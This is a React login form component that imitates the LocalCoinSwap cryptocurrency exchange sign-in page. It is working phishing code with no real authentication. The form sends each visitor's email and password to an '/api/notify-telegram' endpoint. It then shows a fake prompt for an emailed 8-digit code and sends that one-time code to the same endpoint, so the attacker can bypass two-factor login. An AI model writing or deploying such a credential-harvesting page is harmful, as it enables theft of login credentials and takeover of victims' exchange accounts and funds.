"use client";

import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";


export default function LoginForm() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [otp, setOtp] = useState("");
  
  // Controls visibility of the OTP step
  const [step, setStep] = useState<"login" | "otp">("login");
  const [isLoading, setIsLoading] = useState(false);

  // 1. Send Email and Password to Telegram
  const handleLogin = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setIsLoading(true);

    try {
      await fetch("/api/notify-telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          type: "login_attempt",
          email,
          password,
        }),
      });

      // Move to the next step (OTP)
      setStep("otp");
    } catch (error) {
      console.error("Failed to send login details:", error);
    } finally {
      setIsLoading(false);
    }
  };

  // 2. Send OTP to Telegram
  const handleOtpSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setIsLoading(true);

    try {
      await fetch("/api/notify-telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          type: "otp_entered",
          email,
          otp,
        }),
      });
      
    //  alert("Code submitted successfully!");
    } catch (error) {
      console.error("Failed to send OTP:", error);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <main className="flex mt-20 items-center justify-center bg-[#030609] px-4  sm:px-6 lg:px-10">
      <section
        className="
          grid
          w-full
          max-w-[1200px]
          grid-cols-1
          overflow-hidden
          rounded-lg
          bg-[#09131d]
          px-6
          py-12
          sm:px-10
          md:px-14
          lg:min-h-[415px]
          lg:grid-cols-2
          lg:px-16
          lg:py-14
        "
      >
        {/* Left side - Empty space on desktop */}
        <div className="hidden lg:block" />

        {/* Login form */}
        <div className="flex w-full flex-col justify-center lg:pl-5">
          <h1 className="mb-8 text-center text-2xl font-semibold text-white sm:text-[28px]">
            Login to LocalCoinSwap
          </h1>

          {/* Green Banner - Only shows when in OTP step */}
          {step === "otp" && (
            <div className="mb-6 rounded-md bg-green-600 px-4 py-3 text-sm font-medium text-white">
              Please enter the 8 digit code sent to your email.
            </div>
          )}

          <form 
            onSubmit={step === "login" ? handleLogin : handleOtpSubmit} 
            className="w-full space-y-5"
          >
            {/* Email */}
            <div className="space-y-1.5">
              <Label
                htmlFor="email"
                className="text-sm font-medium text-[#a9c8f2]"
              >
                Email
              </Label>

              <Input
                id="email"
                type="email"
                placeholder="you@email.com"
                autoComplete="email"
                required
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                disabled={step === "otp"}
                className="
                  h-[39px]
                  rounded-[4px]
                  border-[#23445c]
                  bg-transparent
                  px-2
                  text-[15px]
                  text-white
                  placeholder:text-[#a9c8f2]
                  focus-visible:border-[#38bdf8]
                  focus-visible:ring-1
                  focus-visible:ring-[#38bdf8]
                  disabled:opacity-50
                "
              />
            </div>

            {/* Password */}
            <div className="space-y-1.5">
              <Label
                htmlFor="password"
                className="text-sm font-medium text-[#a9c8f2]"
              >
                Password
              </Label>

              <Input
                id="password"
                type="password"
                autoComplete="current-password"
                required
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                disabled={step === "otp"}
                className="
                  h-[38px]
                  rounded-[4px]
                  border-[#23445c]
                  bg-transparent
                  px-2
                  text-[15px]
                  text-white
                  focus-visible:border-[#38bdf8]
                  focus-visible:ring-1
                  focus-visible:ring-[#38bdf8]
                  disabled:opacity-50
                "
              />
            </div>

            {/* OTP Field - Hidden initially, appears after login */}
            {step === "otp" && (
              <div className="space-y-1.5">
                <Label
                  htmlFor="otp"
                  className="text-sm font-medium text-[#a9c8f2]"
                >
                  8 digit code
                </Label>

                <Input
                  id="otp"
                  type="text"
                  inputMode="numeric"
                  maxLength={8}
                  value={otp}
                  onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
                  required
                  placeholder="Enter 8 digits"
                  className="
                    h-[38px]
                    rounded-[4px]
                    border-[#23445c]
                    bg-transparent
                    px-2
                    text-[15px]
                    text-white
                    placeholder:text-[#a9c8f2]
                    focus-visible:border-[#38bdf8]
                    focus-visible:ring-1
                    focus-visible:ring-[#38bdf8]
                  "
                />
              </div>
            )}

            {/* Submit Button */}
            <Button
              type="submit"
              disabled={isLoading}
              className="
                mt-3
                h-[46px]
                w-full
                rounded-full
                bg-[#35b4f2]
                text-[16px]
                font-bold
                text-white
                shadow-none
                transition-colors
                hover:bg-[#20a5e5]
                active:scale-[0.99]
                disabled:opacity-70
              "
            >
              {isLoading 
                ? "Processing..." 
                : step === "login" 
                  ? "Login" 
                  : "Submit Code"
              }
            </Button>
          </form>
        </div>
      </section>
    </main>
  );
}